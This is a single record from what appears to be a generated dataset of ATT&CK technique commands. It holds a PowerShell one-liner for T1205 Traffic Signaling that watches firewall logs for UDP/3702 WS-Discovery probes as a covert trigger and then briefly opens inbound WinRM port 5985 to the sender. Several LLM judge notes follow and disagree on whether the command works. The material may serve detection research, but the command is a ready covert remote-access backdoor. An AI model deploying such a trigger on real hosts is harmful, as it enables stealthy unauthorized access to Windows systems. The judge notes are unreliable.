command: Invoke-Command -ComputerName localhost -ScriptBlock { $log = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\b(ALLOW|DROP)\s+UDP\s+(\d{1,3}(?:\.\d{1,3}){3})\s+\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+3702\b') { $src=$matches[2]; $name="wsd-winrm-$($src.Replace('.','-'))"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -RemoteAddress $src -EdgeTraversalPolicy Allow -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }
explanation: Leverages WS-Discovery (UDP/3702) probes as a covert signal to enable WinRM (5985) with scoped access and temporary edge traversal.
rationale_steps: Monitor for inbound WS-Discovery probes on UDP/3702
Add a time-limited allow rule for TCP/5985 scoped to the source IP

llm_judgments.syntactic_justification: Balanced braces and quotes with valid cmdlet parameters, a correctly quoted regex, and proper pipeline/scriptblock usage make it well-formed and parseable.
llm_judgments.semantic_justification: It implements traffic signaling by tailing firewall logs for UDP/3702 and creating a temporary, scoped WinRM (5985) rule on signal, but it requires administrative privileges, assumes PS remoting to localhost, and does not ensure the WinRM service/listener is enabled.

llm_judgments.syntactic_justification: The command is largely well-formed PowerShell with balanced braces and proper pipeline usage, though the double-escaped backslashes (e.g., `\b`, `\.`) suggest the regex was written for a context where escaping is doubled, which may cause regex matching issues at runtime but won't prevent parsing.
llm_judgments.semantic_justification: The command precisely implements T1205 Traffic Signaling by monitoring Windows Firewall logs for UDP/3702 (WS-Discovery) packets as covert triggers, then dynamically creating scoped, time-limited WinRM (TCP/5985) firewall rules with edge traversal for the signaling source IP, which is operationally coherent and realistic.

llm_judgments.syntactic_justification: The PowerShell script block is well-formed with correct nesting and piping, but it includes invalid parameters (-All and -LogDropped) for the Set-NetFirewallProfile cmdlet.
llm_judgments.semantic_justification: The command's logic correctly implements T1205 by monitoring firewall logs for a signal, but the regex is broken by double-escaped backslashes, and it requires Administrator privileges despite the metadata.
